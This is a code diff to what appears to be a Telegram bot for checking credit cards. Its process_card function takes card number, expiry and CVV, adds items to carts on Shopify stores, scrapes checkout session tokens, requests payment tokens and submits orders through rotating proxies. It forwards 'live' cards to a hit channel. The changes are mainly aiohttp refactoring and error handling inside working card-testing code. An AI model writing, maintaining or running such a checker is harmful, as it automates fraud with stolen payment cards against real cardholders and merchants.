@@ -389,9 +389,14 @@ async def make_graphql_request_with_captcha_handling(
     
     for attempt in range(max_retries + 1):
         try:
-            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
-            response_text = await response.text()
-            return response, response_text, False
+            async with session.post(graphql_url, params=params, headers=headers, json=json_data) as response:
+                response_text = await response.text()
+                response_meta = {
+                    'status': response.status,
+                    'url': str(response.url),
+                    'headers': dict(response.headers)
+                }
+            return response_meta, response_text, False
             
         except Exception as e:
             if attempt == max_retries:
@@ -920,22 +925,22 @@ async def test_site_connection(site_url, proxy_str=None):
             # Add to cart
             cart_url = site_url + '/cart/add.js'
             cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
-            cart_resp = await session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
-            
-            if cart_resp.status != 200:
-                return False, f"Cart failed: {cart_resp.status}", None
+            async with session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
+                cart_status = cart_resp.status
+
+            if cart_status != 200:
+                return False, f"Cart failed: {cart_status}", None
             
             # Go to checkout
             checkout_url = site_url + '/checkout/'
-            response = await session.post(url=checkout_url, allow_redirects=True, headers=headers, proxy=proxy)
-            
-            if 'login' in str(response.url).lower():
-                return False, "Login required", None
-            
-            text = await response.text()
-            
-            # Extract session token
-            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+            async with session.post(url=checkout_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
+                checkout_response_url = str(response.url)
+                if 'login' in checkout_response_url.lower():
+                    return False, "Login required", None
+
+                text = await response.text()
+                # Extract session token
+                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;') or \
                       extract_between(text, 'name="serialized-sessionToken" content="', '"') or \
@@ -1012,33 +1017,33 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Accept': 'application/json, text/javascript'
                 }
-                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
-                
-                if cart_resp.status != 200:
+                async with session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
+                    cart_status = cart_resp.status
+
+                if cart_status != 200:
                     cart_headers_alt = {
                         **headers,
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     }
                     cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
-                    cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
+                    async with session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy) as cart_resp:
+                        cart_status = cart_resp.status
                 
-                if cart_resp.status != 200:
-                    return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency, receipt_id, order_url
+                if cart_status != 200:
+                    return False, f"Cart failed with status {cart_status}", gateway, total_price, currency, receipt_id, order_url
 
                 checkout_headers = {
                     **headers,
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                 }
-                response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
-                checkout_url = str(response.url)
+                async with session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy) as response:
+                    checkout_url = str(response.url)
+                    attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+                    attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
 
-                attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
-                attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
-
-                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
-                
-                text = await response.text()
+                    sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+                    text = await response.text()
                 if not sst:
                     sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                     if not sst:
@@ -1356,14 +1361,14 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     "payment_session_scope": f"www.{urlparse(url).netloc}"
                 }
                 
-                response = await session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy)
-                try:
-                    token_data = await response.json()
-                    token = token_data.get('id')
-                    if not token:
-                        return False, 'Unable to get payment token', gateway, total_price, currency, receipt_id, order_url
-                except Exception as e:
-                    return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency, receipt_id, order_url
+                async with session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy) as response:
+                    try:
+                        token_data = await response.json(content_type=None)
+                        token = token_data.get('id')
+                        if not token:
+                            return False, 'Unable to get payment token', gateway, total_price, currency, receipt_id, order_url
+                    except Exception as e:
+                        return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency, receipt_id, order_url
 
                 params = {'operationName': 'SubmitForCompletion'}
                 
@@ -2023,13 +2028,16 @@ by @still_alivenow"""
                         disable_web_page_preview=True
                     )
                     if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                        await asyncio.sleep(0.3)
-                        await app.send_message(
-                            chat_id=HIT_CHANNEL,
-                            text=formatted_message,
-                            parse_mode=ParseMode.HTML,
-                            disable_web_page_preview=True
-                        )
+                        try:
+                            await asyncio.sleep(0.3)
+                            await app.send_message(
+                                chat_id=HIT_CHANNEL,
+                                text=formatted_message,
+                                parse_mode=ParseMode.HTML,
+                                disable_web_page_preview=True
+                            )
+                        except Exception as channel_error:
+                            logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
                 except Exception as e:
                     logger.error(f"Error sending message to user {user_id}: {e}")
                     # Fallback to plain text to avoid HTML parsing failures.
@@ -2057,13 +2065,16 @@ by @still_alivenow"""
                             disable_web_page_preview=True
                         )
                         if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                            await asyncio.sleep(0.3)
-                            await app.send_message(
-                                chat_id=HIT_CHANNEL,
-                                text=formatted_message,
-                                parse_mode=ParseMode.HTML,
-                                disable_web_page_preview=True
-                            )
+                            try:
+                                await asyncio.sleep(0.3)
+                                await app.send_message(
+                                    chat_id=HIT_CHANNEL,
+                                    text=formatted_message,
+                                    parse_mode=ParseMode.HTML,
+                                    disable_web_page_preview=True
+                                )
+                            except Exception as channel_error:
+                                logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
                     
                     except Exception as e:
                         logger.error(f"Error sending hit message to user {user_id}: {e}")
@@ -3432,7 +3443,7 @@ async def showproxy_command(client, message):
         file_path = f"proxies_{user.id}.txt"
         async with aiofiles.open(file_path, 'w') as f:
             await f.write('\n'.join(proxies))
-        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})", disable_web_page_preview=True)
+        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})")
         os.remove(file_path)
     else:
         await message.reply_text(proxy_text, disable_web_page_preview=True)
